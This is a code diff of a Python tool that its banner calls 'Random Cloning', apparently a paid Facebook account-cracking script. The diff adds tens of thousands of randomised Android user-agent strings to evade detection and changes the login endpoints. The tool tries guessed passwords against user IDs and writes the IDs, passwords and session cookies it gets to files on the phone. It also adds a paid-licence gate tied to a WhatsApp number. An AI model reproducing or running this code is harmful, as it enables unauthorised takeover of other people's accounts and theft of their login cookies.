@@ -93,6 +93,62 @@ rr = random.randint
 for xd in range(3005):
     ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
     uas.append(ff)
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14'])
+	c='Pixel XL Build/QP1A.191005.007.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(20,110)
+	e='0'
+	f=random.randrange(2000,6000)
+	g=random.randrange(30,80)
+	h='Mobile Safari/537.36'
+	ua=f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}"
+	ugen.append(ua)
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; U; Android'
+	b=random.choice(['8','9','10','11','12','13','14'])
+	c='en-in; SM-M325F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=random.randrange(20,116)
+	e='0'
+	f=random.randrange(2000,6000)
+	g=random.randrange(30,80)
+	h='Mobile Safari/537.36'
+	i='PHX/13.2'
+	ua=f"{a} {b}; {c}{d}.{e}.{f}.{g} {h} {i}"
+	ugen.append(ua)
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14'])
+	c='220333QL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=random.randrange(20,99)
+	e='0'
+	f=random.randrange(2000,4500)
+	g=random.randrange(30,140)
+	h='Mobile Safari/537.36'
+	ua=f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}"
+	ugen.append(ua)
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14'])
+	c='RMX3360) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=random.randrange(20,99)
+	e='0'
+	f=random.randrange(2000,4600)
+	g=random.randrange(30,130)
+	h='Mobile Safari/537.36'
+	ua=f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}"
+	ugen.append(ua)
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['10.0.1','11.0.1','9','10','11','12','13','14'])
+	c='Oppo 62A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(20,99)
+	e='0'
+	f=random.randrange(2000,4600)
+	g=random.randrange(30,130)
+	h='Mobile Safari/537.36'
+	ua=f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}"
+	ugen.append(ua)
 for sat in range(1000):
 	a='NokiaX'
 	b=random.randrange(1,9)
@@ -128,52 +184,20 @@ def clear():
 	print(logo)
 #--------Logo Def--------#
 logo=(f""" 
- \x1b[38;5;46mMM    MM RRRRRR      DDDDD    OOOOO  NN   NN 
- \x1b[38;5;46mMMM  MMM RR   RR     DD  DD  OO   OO NNN  NN 
- \x1b[38;5;46mMM MM MM RRRRRR      DD   DD OO   OO NN N NN 
- \x1b[38;5;46mMM    MM RR  RR  ... DD   DD OO   OO NN  NNN 
- \x1b[38;5;46mMM    MM RR   RR ... DDDDDD   OOOO0  NN   NN                  
+\x1b[38;5;46m MM    MM RRRRRR      DDDDD    OOOOO  NN   NN 
+\x1b[38;5;46m MMM  MMM RR   RR     DD  DD  OO   OO NNN  NN 
+\x1b[38;5;46m MM MM MM RRRRRR      DD   DD OO   OO NN N NN 
+\x1b[38;5;46m MM    MM RR  RR  ... DD   DD OO   OO NN  NNN 
+\x1b[38;5;46m MM    MM RR   RR ... DDDDDD   OOOO0  NN   NN
+                                                      
 \x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m●\x1b[38;5;46mMr.Roton
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m●\x1b[38;5;46mMr.Roton
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ●\x1b[38;5;46m0.3
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m●\x1b[38;5;46mMr.DON
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m●\x1b[38;5;46mMr.DON
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ●\x1b[38;5;46m0.2
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ●\x1b[38;5;46mRandom Cloning
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ●\x1b[38;5;46mPaid
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ●\x1b[38;5;46mPaid tols 
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ●\x1b[38;5;46mWassap Nambar 01787328738
 \x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆""")
-#===--------------------------[ APPROVAL ]--------------------------===#
-def keyx():
-	uuidd = str(os.getlogin()) + str(os.getuid())
-	xxrxx = "".join(uuidd).replace("_","").replace("360","").replace("u","9").replace("a","A")
-	plat = platform.version()[18:][:8][::-1].upper()+platform.release()[5:][::-3].upper()+platform.version()[:8]
-	xxxrx = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
-	key4x = "RO2H6STN"+xxrxx+xxxrx+"OS"
-	return key4x
-____key____=keyx()
-____l_____k=requests.get("https://github.com/Roton132/Lisens").text
-def approval():
-	try:
-		if ____key____ in ____l_____k:
-			License()
-		else:
-			logo()
-			print(f"{SP}[{RP}+{SP}] Your Key : {GP}{____key____}{E}")
-			line()
-			print(f"{SP}[{RP}+{SP}]  7 DAY : {GP}300  {SP}TAKA")
-			print(f"{SP}[{RP}+{SP}] 15 DAY : {GP}600  {SP}TAKA")
-			print(f"{SP}[{RP}+{SP}] 30 DAY : {GP}1200 {SP}TAKA")
-			line()
-			input(f"{SP}[{RP}+{SP}] Press Enter To Send Key")
-			os.system('am start https://wa.me/+8801787328738?text=' +____key____)
-			approval()
-	except requests.exceptions.ConnectionError:exit(' No internet connection ..')
-#===--------------------------[ LICENSE ]--------------------------===#
-def License():
-	logo()
-	_x=input(f'{SP}[{RP}+{SP}] LICENSE : {GP}')
-	if _x in ["R00TN"]:
-		Main()
-	else:
-		line();print(f'\n\t\t  {RP} Incorrect {E}');time.sleep(1);License()
 #--------Main---------#
 def Main():
 	os.system('clear')
@@ -239,7 +263,7 @@ def b(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://m.alpha.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -250,31 +274,36 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = { 'authority': 'm.facebook.com',
-		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-  		  'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-		    'cache-control': 'max-age=0',
-  		  'dpr': '2.700000047683716',
-		    'sec-ch-prefers-color-scheme': 'light',
-  		  'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-  		  'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
-  		  'sec-ch-ua-mobile': '?1',
- 	    'sec-ch-ua-model': '"POCO M2 Pro"',
+            header_freefb = {'authority': 'm.alpha.facebook.com',
+			'method': 'GET',
+			'path': '/login/device-based/login/async/?refsrc=deprecated&lwv=100',
+			'scheme': 'https',
+		    'accept': '*/*',
+  		  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+ 		   'accept-language': 'en-US,en;q=0.9',
+ 		   'cache-control': 'max-age=0',
+    		'dpr': '2',
+   		 'sec-ch-prefers-color-scheme': 'light',
+   		 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    		'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+   		 'sec-ch-ua-mobile': '?1',
+  		  'sec-ch-ua-model': '"RMX3201"',
   		  'sec-ch-ua-platform': '"Android"',
-		    'sec-ch-ua-platform-version': '"12.0.0"',
-		    'sec-fetch-dest': 'document',
-		    'sec-fetch-mode': 'navigate',
-		    'sec-fetch-site': 'none',
-		    'sec-fetch-user': '?1',
-  		  'upgrade-insecure-requests': '1',
-		    'user-agent': pro}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+  		  'sec-ch-ua-platform-version': '"11.0.0"',
+ 		   'sec-fetch-dest': 'document',
+  		  'sec-fetch-mode': 'navigate',
+   		 'sec-fetch-site': 'none',
+  		  'sec-fetch-user': '?1',
+ 		   'upgrade-insecure-requests': '1',
+  		  'user-agent': pro,
+   		 'viewport-width': '980',}
+            lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[65:80]
                 print('\033[38;5;46m[ROTON-OK] ' +uid+'|'+ps+    '  \n\033[1;31m[\x1b[38;5;46mCOOKIE - 🍪\033[1;31m] \033[1;97m'+coki+ ' ')
-      #          cek_apk(session,coki)                
+                cek_apk(session,coki)                
                 open('/sdcard/ROTON-COOKIE.txt','a').write(uid+'|'+ps+ '|' +coki+'\n')
                 open('/sdcard/ROTON-OK.txt', 'a').write( uid+'|'+ps+'\n')
                 oks.append(uid)
@@ -282,7 +311,7 @@ def b(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-        #        print('\033[38;5;46m[ROTON-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
+                print('\033[38;5;46m[ROTON-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                 open('/sdcard/ROTON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
@@ -293,4 +322,35 @@ def b(uid,pwx,tl):
         sys.stdout.flush()
     except:
         pass
-Main()
+def superuser():
+    UMO="Roton-"
+    uuid = str(os.geteuid()) + str(os.getlogin()) 
+    id = "5".join(uuid)
+    print(logo)
+    DARK=requests.get("https://github.com/Roton132/Lisens/blob/main/Aprubal").text
+    if id in DARK:
+        Main()
+    else:
+        os.system("clear")
+        os.system("xdg-open https://facebook.com/H4M1M.69")
+        time.sleep(3.0)
+        
+        os.system("clear")
+        print(logo)
+        print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
+        print ("")
+        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
+        print ("")
+        print("                Your Key is Not Approved ")
+        print("               Copy And Send Key To Admin")
+        print ("")
+        print (" Your Key : "+UMO+id)
+        print ("\n")
+        os.system("espeak \"assalamualaikum ,I am B.D.H.A ROBOT and my boss is Mr Mehedi.Sir this tool is paid because 100% ok id just now login\"")
+        name = input(" Your Name : ")
+        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
+        print ("")
+        input(" Press Enter To Send Key")
+        os.system("xdg-open https://wa.me/+8801787328738")
+       # superuser()        
+superuser()
